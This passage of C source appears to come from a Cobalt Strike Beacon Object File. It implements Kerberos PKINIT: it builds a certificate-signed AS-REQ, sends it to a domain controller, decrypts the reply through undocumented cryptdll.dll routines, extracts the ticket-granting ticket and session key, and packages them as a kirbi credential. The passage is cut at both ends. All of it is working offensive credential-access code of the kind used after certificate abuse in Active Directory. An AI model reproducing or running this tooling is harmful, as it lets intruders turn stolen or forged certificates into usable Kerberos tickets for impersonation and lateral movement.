     memcpy(buf+off, csTag, csTagLen); off+=csTagLen; free(cs); free(csTag);
 
     /* ctime [1] */
     sprintf(ts, "%04d%02d%02d%02d%02d%02dZ",
         st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
     int ctLen, ctTagLen;
     BYTE* ct    = sc_asn_gtime(ts, &ctLen);
     BYTE* ctTag = sc_asn_ctx(1, ct, ctLen, &ctTagLen);
     memcpy(buf+off, ctTag, ctTagLen); off+=ctTagLen; free(ct); free(ctTag);
 
     /* nonce [2] */
     int ncLen, ncTagLen;
     BYTE* nc    = sc_asn_int(g_nonce, &ncLen);
     BYTE* ncTag = sc_asn_ctx(2, nc, ncLen, &ncTagLen);
     memcpy(buf+off, ncTag, ncTagLen); off+=ncTagLen; free(nc); free(ncTag);
 
     /* paChecksum [3] */
     int pcOctetLen, pcTagLen;
     BYTE* pcOctet = sc_asn_octet(cksum, cksumLen, &pcOctetLen);
     BYTE* pcTag   = sc_asn_ctx(3, pcOctet, pcOctetLen, &pcTagLen);
     memcpy(buf+off, pcTag, pcTagLen); off+=pcTagLen; free(pcOctet); free(pcTag);
 
     return sc_asn_seq(buf, off, outLen);
 }
 
 static BYTE* sc_dh_spki(int* outLen) {
     BYTE buf[1024], dpBuf[256], algBuf[512];
     int off = 0;
     /* OID dhpublicnumber: 1.2.840.10046.2.1 */
     BYTE dhOid[] = { 0x06,0x07,0x2A,0x86,0x48,0xCE,0x3E,0x02,0x01 };
     int pLen, gLen, dpLen, algLen, pkiLen, pkbLen;
 
     BYTE* pInt = sc_asn_int_raw((BYTE*)SC_DH_P, sizeof(SC_DH_P), &pLen);
     BYTE* gInt = sc_asn_int_raw((BYTE*)SC_DH_G, sizeof(SC_DH_G), &gLen);
     memcpy(dpBuf, pInt, pLen); memcpy(dpBuf+pLen, gInt, gLen); free(pInt); free(gInt);
     BYTE* dp = sc_asn_seq(dpBuf, pLen+gLen, &dpLen);
 
     memcpy(algBuf, dhOid, sizeof(dhOid));
     memcpy(algBuf+sizeof(dhOid), dp, dpLen); free(dp);
     BYTE* alg = sc_asn_seq(algBuf, sizeof(dhOid)+dpLen, &algLen);
     memcpy(buf+off, alg, algLen); off+=algLen; free(alg);
 
     BYTE* pki = sc_asn_int_raw(g_dh_pub, sizeof(g_dh_pub), &pkiLen);
     BYTE* pkb = sc_asn_bits(pki, pkiLen, &pkbLen);
     memcpy(buf+off, pkb, pkbLen); off+=pkbLen; free(pki); free(pkb);
 
     return sc_asn_seq(buf, off, outLen);
 }
 
 static BYTE* sc_pkinit_authpack(BYTE* cksum, int cksumLen, int* outLen) {
     BYTE buf[2048];
     int off = 0;
     int authLen, authTagLen, spkiLen, spkiTagLen;
 
     BYTE* auth    = sc_pkinit_authenticator(cksum, cksumLen, &authLen);
     BYTE* authTag = sc_asn_ctx(0, auth, authLen, &authTagLen);
     memcpy(buf+off, authTag, authTagLen); off+=authTagLen; free(auth); free(authTag);
 
     BYTE* spki    = sc_dh_spki(&spkiLen);
     BYTE* spkiTag = sc_asn_ctx(1, spki, spkiLen, &spkiTagLen);
     memcpy(buf+off, spkiTag, spkiTagLen); off+=spkiTagLen; free(spki); free(spkiTag);
 
     return sc_asn_seq(buf, off, outLen);
 }
 
 static BYTE* sc_cms_sign(PCCERT_CONTEXT pCert, BYTE* content, int cLen, int* outLen) {
     HCRYPTPROV hProv = 0;
     DWORD keySpec = 0;
     BOOL fFree = FALSE;
     HCRYPTMSG hMsg = NULL;
     BYTE* signed_msg = NULL;
     DWORD signedLen = 0;
     CMSG_SIGNER_ENCODE_INFO si;
     CMSG_SIGNED_ENCODE_INFO sdi;
     CERT_BLOB cb;
     *outLen = 0;
 
     if (!CryptAcquireCertificatePrivateKey(pCert, CRYPT_ACQUIRE_USE_PROV_INFO_FLAG,
             NULL, &hProv, &keySpec, &fFree)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptAcquireCertificatePrivateKey: 0x%08X", GetLastError());
         return NULL;
     }
 
     memset(&si,0,sizeof(si));
     si.cbSize             = sizeof(si);
     si.pCertInfo          = pCert->pCertInfo;
     si.hCryptProv         = hProv;
     si.dwKeySpec          = keySpec;
     si.HashAlgorithm.pszObjId = (LPSTR)szOID_RSA_SHA1RSA;
 
     cb.cbData = pCert->cbCertEncoded;
     cb.pbData = pCert->pbCertEncoded;
 
     memset(&sdi,0,sizeof(sdi));
     sdi.cbSize        = sizeof(sdi);
     sdi.cSigners      = 1;
     sdi.rgSigners     = &si;
     sdi.cCertEncoded  = 1;
     sdi.rgCertEncoded = &cb;
 
     hMsg = CryptMsgOpenToEncode(PKCS_7_ASN_ENCODING|X509_ASN_ENCODING, 0, CMSG_SIGNED,
         &sdi, OID_PKINIT_AUTHDATA, NULL);
     if (!hMsg) { BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptMsgOpenToEncode: 0x%08X", GetLastError()); goto cms_done; }
     if (!CryptMsgUpdate(hMsg, content, cLen, TRUE)) { BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptMsgUpdate failed"); goto cms_done; }
     if (!CryptMsgGetParam(hMsg, CMSG_CONTENT_PARAM, 0, NULL, &signedLen)) goto cms_done;
 
     signed_msg = (BYTE*)malloc(signedLen);
     if (!CryptMsgGetParam(hMsg, CMSG_CONTENT_PARAM, 0, signed_msg, &signedLen)) {
         free(signed_msg); signed_msg = NULL; goto cms_done;
     }
     *outLen = signedLen;
 
 cms_done:
     if (hMsg) CryptMsgClose(hMsg);
     if (fFree && hProv) CryptReleaseContext(hProv, 0);
     return signed_msg;
 }
 
 static BYTE* sc_pkinit_pa(PCCERT_CONTEXT pCert, BYTE* authPack, int apLen, int* outLen) {
     int sdLen, lsLen;
     BYTE* sd = sc_cms_sign(pCert, authPack, apLen, &sdLen);
     if (!sd) return NULL;
 
     BYTE* buf = (BYTE*)malloc(8192);
     int off = 0;
     /* signedAuthPack [0] IMPLICIT */
     buf[off++] = 0x80;
     off += sc_der_len_enc(buf+off, sdLen);
     memcpy(buf+off, sd, sdLen); off+=sdLen; free(sd);
 
     BYTE* r = sc_asn_seq(buf, off, outLen);
     free(buf);
     return r;
 }
 
 static BYTE* sc_pkinit_asreq(PCCERT_CONTEXT pCert, const char* user, const char* domain, int* outLen) {
     char* realm = (char*)malloc(256);
     BYTE* padataContent = (BYTE*)malloc(8192);
     BYTE* asReqContent  = (BYTE*)malloc(16384);
     BYTE* result = NULL;
     int i;
 
     int reqBodyLen, authPackLen, paPkAsReqLen, padataOffset, padataSeqLen, asReqOffset;
     int paTypeLen, paTypeTagLen, paValueOctetLen, paValueTagLen;
     int pvnoLen, pvnoTagLen, msgTypeLen, msgTypeTagLen;
     int padataOuterSeqLen, padataOuterTagLen, reqBodyTagLen, asReqSeqLen;
 
     BYTE* reqBody;
     BYTE* authPack;
     BYTE* paPkAsReq;
     BYTE* paTypeInt;
     BYTE* paTypeTag;
     BYTE* paValueOctet;
     BYTE* paValueTag;
     BYTE* padataSeq;
     BYTE* pvnoInt;
     BYTE* pvnoTag;
     BYTE* msgTypeInt;
     BYTE* msgTypeTag;
     BYTE* padataOuterSeq;
     BYTE* padataOuterTag;
     BYTE* reqBodyTag;
     BYTE* asReqSeq;
 
     HCRYPTPROV hProv;
     HCRYPTHASH hHash;
     BYTE paChecksum[20];
     DWORD hashLen = 20;
 
     /* Convert domain to uppercase for realm */
     for (i = 0; domain[i] && i < 255; i++)
         realm[i] = (domain[i] >= 'a' && domain[i] <= 'z') ? domain[i] - 32 : domain[i];
     realm[i] = '\0';
 
     /* Build req-body first — needed for paChecksum */
     reqBody = sc_krb_reqbody(user, realm, &reqBodyLen);
 
     if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptAcquireContextW failed");
         free(reqBody);
         goto cleanup;
     }
 
     /* Generate DH keys */
     sc_dh_generate(hProv);
 
     /* SHA-1 of req-body for paChecksum */
     CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash);
     CryptHashData(hHash, reqBody, reqBodyLen, 0);
     CryptGetHashParam(hHash, HP_HASHVAL, paChecksum, &hashLen, 0);
     CryptDestroyHash(hHash);
     CryptReleaseContext(hProv, 0);
 
     /* Build AuthPack */
     authPack = sc_pkinit_authpack(paChecksum, 20, &authPackLen);
 
     /* Build PA-PK-AS-REQ */
     paPkAsReq = sc_pkinit_pa(pCert, authPack, authPackLen, &paPkAsReqLen);
     free(authPack);
 
     if (!paPkAsReq) {
         free(reqBody);
         goto cleanup;
     }
 
     /* Build PA-DATA sequence */
     padataOffset = 0;
 
     paTypeInt = sc_asn_int(PA_PK_AS_REQ, &paTypeLen);
     paTypeTag = sc_asn_ctx(1, paTypeInt, paTypeLen, &paTypeTagLen);
     memcpy(padataContent + padataOffset, paTypeTag, paTypeTagLen);
     padataOffset += paTypeTagLen;
     free(paTypeInt); free(paTypeTag);
 
     paValueOctet = sc_asn_octet(paPkAsReq, paPkAsReqLen, &paValueOctetLen);
     paValueTag   = sc_asn_ctx(2, paValueOctet, paValueOctetLen, &paValueTagLen);
     memcpy(padataContent + padataOffset, paValueTag, paValueTagLen);
     padataOffset += paValueTagLen;
     free(paValueOctet); free(paValueTag); free(paPkAsReq);
 
     padataSeq = sc_asn_seq(padataContent, padataOffset, &padataSeqLen);
 
     /* Build AS-REQ */
     asReqOffset = 0;
 
     pvnoInt = sc_asn_int(5, &pvnoLen);
     pvnoTag = sc_asn_ctx(1, pvnoInt, pvnoLen, &pvnoTagLen);
     memcpy(asReqContent + asReqOffset, pvnoTag, pvnoTagLen);
     asReqOffset += pvnoTagLen;
     free(pvnoInt); free(pvnoTag);
 
     msgTypeInt = sc_asn_int(KRB_AS_REQ, &msgTypeLen);
     msgTypeTag = sc_asn_ctx(2, msgTypeInt, msgTypeLen, &msgTypeTagLen);
     memcpy(asReqContent + asReqOffset, msgTypeTag, msgTypeTagLen);
     asReqOffset += msgTypeTagLen;
     free(msgTypeInt); free(msgTypeTag);
 
     /* padata [3] SEQUENCE OF PA-DATA */
     padataOuterSeq = sc_asn_seq(padataSeq, padataSeqLen, &padataOuterSeqLen);
     padataOuterTag = sc_asn_ctx(3, padataOuterSeq, padataOuterSeqLen, &padataOuterTagLen);
     memcpy(asReqContent + asReqOffset, padataOuterTag, padataOuterTagLen);
     asReqOffset += padataOuterTagLen;
     free(padataSeq); free(padataOuterSeq); free(padataOuterTag);
 
     /* req-body [4] */
     reqBodyTag = sc_asn_ctx(4, reqBody, reqBodyLen, &reqBodyTagLen);
     memcpy(asReqContent + asReqOffset, reqBodyTag, reqBodyTagLen);
     asReqOffset += reqBodyTagLen;
     free(reqBody); free(reqBodyTag);
 
     asReqSeq = sc_asn_seq(asReqContent, asReqOffset, &asReqSeqLen);
     result   = sc_asn_app(KRB_AS_REQ, asReqSeq, asReqSeqLen, outLen);
     free(asReqSeq);
 
 cleanup:
     free(realm);
     free(padataContent);
     free(asReqContent);
     return result;
 }
 
 /* =============================================================================
  * Phase 5 — KDC network I/O (TCP, RFC 4120 §7.2)
  * ============================================================================= */
 
 static BYTE* sc_kdc_send(const char* host, int port, BYTE* data, int dLen, int* respLen) {
     WSADATA wsa;
     SOCKET  s = INVALID_SOCKET;
     struct sockaddr_in sa;
     struct hostent* he;
     BYTE lp[4];
     DWORD tl;
     BYTE* resp = NULL;
 
     if (WSAStartup(MAKEWORD(2,2), &wsa)) { BeaconPrintf(CALLBACK_OUTPUT, "[!] WSAStartup failed"); return NULL; }
 
     s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (s == INVALID_SOCKET) { WSACleanup(); return NULL; }
 
     he = gethostbyname(host);
     if (!he) {
         sa.sin_addr.s_addr = inet_addr(host);
         if (sa.sin_addr.s_addr == INADDR_NONE) {
             BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to resolve KDC: %s", host);
             closesocket(s); WSACleanup(); return NULL;
         }
     } else {
         memcpy(&sa.sin_addr, he->h_addr_list[0], he->h_length);
     }
     sa.sin_family = AF_INET;
     sa.sin_port   = htons((unsigned short)port);
 
     if (connect(s, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] KDC connection failed");
         closesocket(s); WSACleanup(); return NULL;
     }
 
     tl = htonl(dLen);
     memcpy(lp, &tl, 4);
     send(s, (char*)lp, 4, 0);
     send(s, (char*)data, dLen, 0);
 
     if (recv(s, (char*)lp, 4, 0) != 4) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to receive response header");
         closesocket(s); WSACleanup(); return NULL;
     }
     memcpy(&tl, lp, 4);
     *respLen = ntohl(tl);
 
     if (*respLen <= 0 || *respLen > 100000) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Invalid KDC response length: %d", *respLen);
         closesocket(s); WSACleanup(); return NULL;
     }
 
     resp = (BYTE*)malloc(*respLen);
     int got = 0;
     while (got < *respLen) {
         int r = recv(s, (char*)resp+got, *respLen-got, 0);
         if (r <= 0) break;
         got += r;
     }
 
     closesocket(s); WSACleanup();
     return resp;
 }
 
 /* =============================================================================
  * Phase 6 — Kerberos crypto via cryptdll.dll
  * ============================================================================= */
 
 static BYTE* sc_krb_decrypt(int etype, int ku, BYTE* key, int kLen, BYTE* data, int dLen, int* outLen) {
     HMODULE hDll = LoadLibraryA("cryptdll.dll");
     if (!hDll) { BeaconPrintf(CALLBACK_OUTPUT, "[!] cryptdll.dll not found"); return NULL; }
 
     CDLocateCSystem_t locate = (CDLocateCSystem_t)GetProcAddress(hDll, "CDLocateCSystem");
     if (!locate) { FreeLibrary(hDll); return NULL; }
 
     SC_ECRYPT* cs = NULL;
     if (locate(etype, (void**)&cs) || !cs) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] CDLocateCSystem failed for etype %d", etype);
         FreeLibrary(hDll); return NULL;
     }
 
     SC_ECRYPT_Init    initFn  = (SC_ECRYPT_Init)cs->Initialize;
     SC_ECRYPT_Decrypt decFn   = (SC_ECRYPT_Decrypt)cs->Decrypt;
     SC_ECRYPT_Finish  finFn   = (SC_ECRYPT_Finish)cs->Finish;
     void* ctx = NULL;
 
     if (initFn(key, kLen, ku, &ctx)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Decrypt init failed");
         FreeLibrary(hDll); return NULL;
     }
 
     int sz = dLen + cs->BlockSize + cs->Size;
     BYTE* out = (BYTE*)malloc(sz);
     int status = decFn(ctx, data, dLen, out, &sz);
     finFn(&ctx);
 
     if (status) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Decrypt failed: 0x%X", status);
         free(out); FreeLibrary(hDll); return NULL;
     }
 
     *outLen = sz;
     FreeLibrary(hDll);
     return out;
 }
 
 static BYTE* sc_krb_encrypt(int etype, int ku, BYTE* key, int kLen, BYTE* data, int dLen, int* outLen) {
     HMODULE hDll = LoadLibraryA("cryptdll.dll");
     if (!hDll) return NULL;
 
     CDLocateCSystem_t locate = (CDLocateCSystem_t)GetProcAddress(hDll, "CDLocateCSystem");
     if (!locate) { FreeLibrary(hDll); return NULL; }
 
     SC_ECRYPT* cs = NULL;
     if (locate(etype, (void**)&cs) || !cs) { FreeLibrary(hDll); return NULL; }
 
     SC_ECRYPT_Init    initFn = (SC_ECRYPT_Init)cs->Initialize;
     SC_ECRYPT_Encrypt encFn  = (SC_ECRYPT_Encrypt)cs->Encrypt;
     SC_ECRYPT_Finish  finFn  = (SC_ECRYPT_Finish)cs->Finish;
     void* ctx = NULL;
 
     if (initFn(key, kLen, ku, &ctx)) { FreeLibrary(hDll); return NULL; }
 
     int sz = dLen + cs->Size;
     BYTE* out = (BYTE*)malloc(sz);
     int status = encFn(ctx, data, dLen, out, &sz);
     finFn(&ctx);
 
     if (status) { free(out); FreeLibrary(hDll); return NULL; }
     *outLen = sz;
     FreeLibrary(hDll);
     return out;
 }
 
 static BYTE* sc_krb_checksum(BYTE* key, int kLen, BYTE* data, int dLen, int ku, int* cLen) {
     HMODULE hDll = LoadLibraryA("cryptdll.dll");
     if (!hDll) return NULL;
 
     CDLocateCheckSum_t locate = (CDLocateCheckSum_t)GetProcAddress(hDll, "CDLocateCheckSum");
     if (!locate) { FreeLibrary(hDll); return NULL; }
 
     SC_CHECKSUM* cs = NULL;
     if (locate(CKSUMTYPE_HMAC_SHA1_96_AES256, (void**)&cs) || !cs) { FreeLibrary(hDll); return NULL; }
 
     SC_CKSUM_InitEx   initFn = (SC_CKSUM_InitEx)cs->InitializeEx;
     SC_CKSUM_Sum      sumFn  = (SC_CKSUM_Sum)cs->Sum;
     SC_CKSUM_Finalize finFn  = (SC_CKSUM_Finalize)cs->Finalize;
     SC_CKSUM_Finish   doneFn = (SC_CKSUM_Finish)cs->Finish;
     void* ctx = NULL;
 
     if (initFn(key, kLen, ku, &ctx)) { FreeLibrary(hDll); return NULL; }
     if (sumFn(ctx, dLen, data)) { doneFn(&ctx); FreeLibrary(hDll); return NULL; }
 
     *cLen = cs->Size;
     BYTE* out = (BYTE*)malloc(*cLen);
     int status = finFn(ctx, out);
     doneFn(&ctx);
 
     if (status) { free(out); FreeLibrary(hDll); return NULL; }
     FreeLibrary(hDll);
     return out;
 }
 
 /* =============================================================================
  * Phase 6 — kTruncate key derivation (RFC 4556 §3.2.3.1)
  * ============================================================================= */
 
 static void sc_ktruncate(int k, BYTE* x, int xLen, BYTE* out) {
     int off = 0;
     BYTE ctr = 0;
     BYTE* buf = (BYTE*)malloc(1 + xLen);
     while (off < k) {
         BYTE hash[20];
         buf[0] = ctr;
         memcpy(buf+1, x, xLen);
         sc_sha1(buf, 1+xLen, hash);
         int n = (k-off < 20) ? (k-off) : 20;
         memcpy(out+off, hash, n);
         off += n; ctr++;
     }
     free(buf);
 }
 
 static void sc_dh_derive_key(BYTE* secret, int sLen, BYTE* nonce, int nLen, BYTE* out, int outLen) {
     int xLen = sLen + nLen;
     BYTE* x = (BYTE*)malloc(xLen);
     memcpy(x, secret, sLen);
     if (nLen > 0 && nonce) memcpy(x+sLen, nonce, nLen);
     sc_ktruncate(outLen, x, xLen, out);
     free(x);
 }
 
 /* =============================================================================
  * Phase 6 — AS-REP parsing
  * ============================================================================= */
 
 /*
  * sc_parse_dh_pubkey - extract KDC DH public key from AS-REP
  *
  * KDCDHKeyInfo has subjectPublicKey [0] BIT STRING containing DER(INTEGER).
  * There is no AlgorithmIdentifier OID next to the key in the KDC response.
  * We scan for a BIT STRING whose payload begins with 0x00 (no unused bits)
  * followed by an INTEGER of 120-140 bytes (1024-bit DH value).
  */
 static BYTE* sc_parse_dh_pubkey(BYTE* buf, int len, int* keyLen) {
     int i;
     *keyLen = 0;
 
     for (i = 0; i < len - 10; i++) {
         if (buf[i] != 0x03) continue;
 
         int bsLen = 0, lBytes = 1;
         if (buf[i+1] & 0x80) {
             int nb = buf[i+1] & 0x7F;
             if (nb > 3 || i+1+nb >= len) continue;
             int k;
             for (k = 1; k <= nb; k++) bsLen = (bsLen << 8) | buf[i+1+k];
             lBytes = 1 + nb;
         } else {
             bsLen = buf[i+1];
         }
 
         int contentOff = i + 1 + lBytes;
         if (contentOff + bsLen > len || bsLen < 5) continue;
 
         /* must start with 0x00 (no unused bits) then INTEGER tag */
         if (buf[contentOff] != 0x00) continue;
         if (buf[contentOff+1] != 0x02) continue;
 
         int intLen = 0, intLBytes = 1;
         if (buf[contentOff+2] & 0x80) {
             int nb = buf[contentOff+2] & 0x7F;
             if (nb > 2) continue;
             int k;
             for (k = 1; k <= nb; k++) intLen = (intLen << 8) | buf[contentOff+2+k];
             intLBytes = 1 + nb;
         } else {
             intLen = buf[contentOff+2];
         }
 
         if (intLen < 120 || intLen > 140) continue;
 
         BYTE* d = buf + contentOff + 1 + intLBytes + 1;
         int cp = intLen;
         if (cp > 0 && d[0] == 0x00 && cp > 1) { d++; cp--; }
 
         BYTE* r = (BYTE*)malloc(128);
         memset(r, 0, 128);
         int dest = 128 - cp;
         if (dest < 0) { dest = 0; cp = 128; }
         memcpy(r + dest, d, cp);
         *keyLen = 128;
         return r;
     }
 
     return NULL;
 }
 
 static BYTE* sc_parse_dh_nonce(BYTE* buf, int len, int* nLen) {
     int i;
     *nLen = 0;
     for (i = 0; i < len-34; i++) {
         if (buf[i]==0x04 && buf[i+1]==0x20) {
             BYTE* c = buf+i+2;
             int j, var=0, allZ=1;
             for (j=1; j<32; j++) {
                 if (c[j]!=c[0]) var=1;
                 if (c[j]!=0)   allZ=0;
             }
             if (var && !allZ) {
                 BYTE* r = (BYTE*)malloc(32);
                 memcpy(r, c, 32);
                 *nLen = 32;
                 return r;
             }
         }
     }
     return NULL;
 }
 
 static BYTE* sc_parse_encpart(BYTE* buf, int len, int* outLen) {
     int i;
     *outLen = 0;
     for (i = 0; i < len-10; i++) {
         if (buf[i] == 0xA6) {
             int epLen, lBytes = sc_der_len_dec(buf, i+1, &epLen);
             int seqStart = i+1+lBytes;
             if (seqStart < len && buf[seqStart] == 0x30) {
                 int j;
                 for (j = seqStart+2; j < seqStart+epLen-5; j++) {
                     if (buf[j] == 0xA2) {
                         int cLen, clb = sc_der_len_dec(buf, j+1, &cLen);
                         int octetStart = j+1+clb;
                         if (octetStart < len && buf[octetStart] == 0x04) {
                             int oLen, olb = sc_der_len_dec(buf, octetStart+1, &oLen);
                             *outLen = oLen;
                             BYTE* r = (BYTE*)malloc(oLen);
                             memcpy(r, buf+octetStart+1+olb, oLen);
                             return r;
                         }
                     }
                 }
             }
         }
     }
     return NULL;
 }
 
 static BYTE* sc_parse_session_key(BYTE* dec, int decLen, int* kLen, int* kType) {
     int i;
     *kLen = 0; *kType = 0;
     for (i = 0; i < decLen-10; i++) {
         if (dec[i] == 0xA0) {
             int j;
             for (j = i+2; j < decLen-5; j++) {
                 if (dec[j]==0xA0 && dec[j+2]==0x02) *kType = dec[j+4];
                 if (dec[j] == 0xA1) {
                     int tLen, tlb = sc_der_len_dec(dec, j+1, &tLen);
                     int os = j+1+tlb;
                     if (os < decLen && dec[os] == 0x04) {
                         int oLen, olb = sc_der_len_dec(dec, os+1, &oLen);
                         *kLen = oLen;
                         BYTE* r = (BYTE*)malloc(oLen);
                         memcpy(r, dec+os+1+olb, oLen);
                         return r;
                     }
                 }
             }
         }
     }
     return NULL;
 }
 
 static BYTE* sc_parse_ticket(BYTE* buf, int len, int* outLen) {
     int off = 0, length;
     *outLen = 0;
     if (buf[off]==0x6B) { off++; off+=sc_der_len_dec(buf,off,&length); }
     if (buf[off]==0x30) { off++; off+=sc_der_len_dec(buf,off,&length); }
     while (off < len-10) {
         if (buf[off] == 0xA5) {
             off++; off+=sc_der_len_dec(buf,off,&length);
             *outLen = length;
             BYTE* r = (BYTE*)malloc(length);
             memcpy(r, buf+off, length);
             return r;
         } else if ((buf[off]&0xE0)==0xA0) {
             int sl; off++; off+=sc_der_len_dec(buf,off,&sl); off+=sl;
         } else off++;
     }
     return NULL;
 }
 
 /* =============================================================================
  * Phase 6 — kirbi / KRB-CRED output
  * ============================================================================= */
 
 static void sc_output_kirbi(BYTE* ticket, int tLen, BYTE* sessKey, int skLen,
     int encType, const char* user, const char* realm)
 {
     int rLen = (int)strlen(realm);
     int uLen = (int)strlen(user);
 
     /* Build KrbCredInfo inline */
     BYTE* ci = (BYTE*)malloc(skLen + 512);
     int ciOff = 0;
 
     /* key [0] EncryptionKey */
     BYTE kc[64]; int kcOff = 0;
     kc[kcOff++]=0xA0;kc[kcOff++]=0x03;kc[kcOff++]=0x02;kc[kcOff++]=0x01;kc[kcOff++]=(BYTE)encType;
     kc[kcOff++]=0xA1;kc[kcOff++]=(BYTE)(skLen+2);kc[kcOff++]=0x04;kc[kcOff++]=(BYTE)skLen;
     memcpy(kc+kcOff, sessKey, skLen); kcOff+=skLen;
     ci[ciOff++]=0xA0;ci[ciOff++]=(BYTE)(kcOff+2);ci[ciOff++]=0x30;ci[ciOff++]=(BYTE)kcOff;
     memcpy(ci+ciOff, kc, kcOff); ciOff+=kcOff;
 
     /* prealm [1] */
     ci[ciOff++]=0xA1;ci[ciOff++]=(BYTE)(rLen+2);ci[ciOff++]=0x1B;ci[ciOff++]=(BYTE)rLen;
     memcpy(ci+ciOff, realm, rLen); ciOff+=rLen;
 
     /* pname [2] */
     BYTE pn[128]; int pnOff=0;
     pn[pnOff++]=0xA0;pn[pnOff++]=0x03;pn[pnOff++]=0x02;pn[pnOff++]=0x01;pn[pnOff++]=0x01;
     pn[pnOff++]=0xA1;pn[pnOff++]=(BYTE)(uLen+4);pn[pnOff++]=0x30;pn[pnOff++]=(BYTE)(uLen+2);
     pn[pnOff++]=0x1B;pn[pnOff++]=(BYTE)uLen;memcpy(pn+pnOff,user,uLen);pnOff+=uLen;
     ci[ciOff++]=0xA2;ci[ciOff++]=(BYTE)(pnOff+2);ci[ciOff++]=0x30;ci[ciOff++]=(BYTE)pnOff;
     memcpy(ci+ciOff,pn,pnOff);ciOff+=pnOff;
 
     /* srealm [8] */
     ci[ciOff++]=0xA8;ci[ciOff++]=(BYTE)(rLen+2);ci[ciOff++]=0x1B;ci[ciOff++]=(BYTE)rLen;
     memcpy(ci+ciOff,realm,rLen);ciOff+=rLen;
 
     /* sname [9] krbtgt/REALM */
     BYTE sn[128]; int snOff=0;
     sn[snOff++]=0xA0;sn[snOff++]=0x03;sn[snOff++]=0x02;sn[snOff++]=0x01;sn[snOff++]=0x02;
     sn[snOff++]=0xA1;sn[snOff++]=(BYTE)(6+2+rLen+2+2);sn[snOff++]=0x30;sn[snOff++]=(BYTE)(6+2+rLen+2);
     sn[snOff++]=0x1B;sn[snOff++]=0x06;memcpy(sn+snOff,"krbtgt",6);snOff+=6;
     sn[snOff++]=0x1B;sn[snOff++]=(BYTE)rLen;memcpy(sn+snOff,realm,rLen);snOff+=rLen;
     ci[ciOff++]=0xA9;ci[ciOff++]=(BYTE)(snOff+2);ci[ciOff++]=0x30;ci[ciOff++]=(BYTE)snOff;
     memcpy(ci+ciOff,sn,snOff);ciOff+=snOff;
 
     /* Wrap credInfo in EncKrbCredPart [APPLICATION 29] */
     BYTE* ecp = (BYTE*)malloc(ciOff+16);
     int ecpOff=0;
     ecp[ecpOff++]=0xA0;
     if (ciOff+2<128) ecp[ecpOff++]=(BYTE)(ciOff+2);
     else { ecp[ecpOff++]=0x82;ecp[ecpOff++]=(BYTE)((ciOff+2)>>8);ecp[ecpOff++]=(BYTE)((ciOff+2)&0xFF); }
     ecp[ecpOff++]=0x30;
     if (ciOff<128) ecp[ecpOff++]=(BYTE)ciOff;
     else { ecp[ecpOff++]=0x82;ecp[ecpOff++]=(BYTE)(ciOff>>8);ecp[ecpOff++]=(BYTE)(ciOff&0xFF); }
     ecp[ecpOff++]=0x30;
     if (ciOff<128) ecp[ecpOff++]=(BYTE)ciOff;
     else { ecp[ecpOff++]=0x82;ecp[ecpOff++]=(BYTE)(ciOff>>8);ecp[ecpOff++]=(BYTE)(ciOff&0xFF); }
     memcpy(ecp+ecpOff,ci,ciOff);ecpOff+=ciOff;
 
     BYTE* a29=(BYTE*)malloc(ecpOff+8); int a29Off=0;
     a29[a29Off++]=0x7D;
     if (ecpOff+2<128) a29[a29Off++]=(BYTE)(ecpOff+2);
     else { a29[a29Off++]=0x82;a29[a29Off++]=(BYTE)((ecpOff+2)>>8);a29[a29Off++]=(BYTE)((ecpOff+2)&0xFF); }
     a29[a29Off++]=0x30;
     if (ecpOff<128) a29[a29Off++]=(BYTE)ecpOff;
     else { a29[a29Off++]=0x82;a29[a29Off++]=(BYTE)(ecpOff>>8);a29[a29Off++]=(BYTE)(ecpOff&0xFF); }
     memcpy(a29+a29Off,ecp,ecpOff);a29Off+=ecpOff;
 
     /* enc-part EncryptedData etype=0, cipher=EncKrbCredPart */
     BYTE* ep=(BYTE*)malloc(a29Off+16); int epOff=0;
     ep[epOff++]=0xA0;ep[epOff++]=0x03;ep[epOff++]=0x02;ep[epOff++]=0x01;ep[epOff++]=0x00;
     ep[epOff++]=0xA2;
     if (a29Off+2<128) ep[epOff++]=(BYTE)(a29Off+2);
     else { ep[epOff++]=0x82;ep[epOff++]=(BYTE)((a29Off+2)>>8);ep[epOff++]=(BYTE)((a29Off+2)&0xFF); }
     ep[epOff++]=0x04;
     if (a29Off<128) ep[epOff++]=(BYTE)a29Off;
     else { ep[epOff++]=0x82;ep[epOff++]=(BYTE)(a29Off>>8);ep[epOff++]=(BYTE)(a29Off&0xFF); }
     memcpy(ep+epOff,a29,a29Off);epOff+=a29Off;
 
     int epSeqLen; BYTE* epSeq=sc_asn_seq(ep,epOff,&epSeqLen);
 
     /* KRB-CRED body */
     BYTE* body=(BYTE*)malloc(tLen+skLen+1024); int bOff=0;
     /* pvno [0]=5, msg-type [1]=22 */
     body[bOff++]=0xA0;body[bOff++]=0x03;body[bOff++]=0x02;body[bOff++]=0x01;body[bOff++]=0x05;
     body[bOff++]=0xA1;body[bOff++]=0x03;body[bOff++]=0x02;body[bOff++]=0x01;body[bOff++]=0x16;
     /* tickets [2] */
     body[bOff++]=0xA2;
     if (tLen+2<128) body[bOff++]=(BYTE)(tLen+2);
     else { body[bOff++]=0x82;body[bOff++]=(BYTE)((tLen+2)>>8);body[bOff++]=(BYTE)((tLen+2)&0xFF); }
     body[bOff++]=0x30;
     if (tLen<128) body[bOff++]=(BYTE)tLen;
     else { body[bOff++]=0x82;body[bOff++]=(BYTE)(tLen>>8);body[bOff++]=(BYTE)(tLen&0xFF); }
     memcpy(body+bOff,ticket,tLen);bOff+=tLen;
     /* enc-part [3] */
     body[bOff++]=0xA3;
     if (epSeqLen<128) body[bOff++]=(BYTE)epSeqLen;
